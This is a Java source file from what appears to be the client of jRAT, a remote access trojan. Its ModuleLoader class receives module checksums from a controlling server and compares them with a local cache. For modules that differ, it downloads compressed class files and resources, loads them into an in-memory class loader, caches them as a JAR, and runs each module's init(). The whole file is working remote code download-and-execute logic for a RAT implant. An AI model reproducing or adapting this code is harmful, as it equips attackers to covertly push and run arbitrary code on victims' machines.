package jrat.client.modules;

import jrat.api.ClientModule;
import jrat.client.Connection;
import jrat.client.Main;
import jrat.common.MemoryClassLoader;
import jrat.common.Logger;
import jrat.common.compress.QuickLZ;
import jrat.common.codec.Hex;

import java.io.ByteArrayOutputStream;
import java.util.Arrays;
import java.util.jar.JarOutputStream;
import java.util.zip.ZipEntry;

public class ModuleLoader {

    /**
     * Read and load modules
     * @param c
     * @throws Exception
     */
    public static void read(Connection c) throws Exception {
        int len = c.readInt();

        for (int i = 0; i < len; i++) {
            // Main module class
            String mainClass = c.readLine();

            byte[] sum = new byte[32];
            c.getDataInputStream().readFully(sum);

            Main.debug("receiving module " + mainClass + " (" + Hex.encode(sum) + ")");

            byte[] localSum = new byte[0];

            try {
                localSum = CachedModuleLookup.lookupSum(mainClass);
            } catch (Exception ex) {
                ex.printStackTrace();
            }

            boolean valid = Arrays.equals(sum, localSum);

            System.out.println("file system integrity check: " + valid);
            if (!valid) {
                System.out.println("remote " + Hex.encode(sum));
                System.out.println("local " + Hex.encode(localSum));
            }

            c.writeBoolean(valid);
            if (valid) {
                continue;
            }

            MemoryClassLoader l = new MemoryClassLoader(ModuleLoader.class.getClassLoader(), null);

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            JarOutputStream jar = new JarOutputStream(baos);

            // read all classes and resources from the server
            while (c.readBoolean()) {
                boolean clazz = c.readBoolean();
                String name = c.readLine();

                int classLen = c.readInt();
                byte[] buffer = new byte[classLen];
                c.getDataInputStream().readFully(buffer);

                buffer = QuickLZ.decompress(buffer);

                if (clazz) {
                    l.addClass(name, buffer);
                } else {
                    l.addResource(name, buffer);
                }

                jar.putNextEntry(new ZipEntry(name));
                jar.write(buffer);
                jar.closeEntry();

                Main.debug("\tclass " + name + " (" + classLen + " b)");
            }

            jar.close();
            CachedModule.store(mainClass, baos.toByteArray());

            // load the main class
            Class<ClientModule> clazz = (Class<ClientModule>) l.loadClass(mainClass);

            ClientModule module = clazz.newInstance();

            try {
                module.init();
            } catch (Exception ex) {
                Logger.warn("module " + mainClass + " failed to load");
                ex.printStackTrace();
            }
        }
    }
}
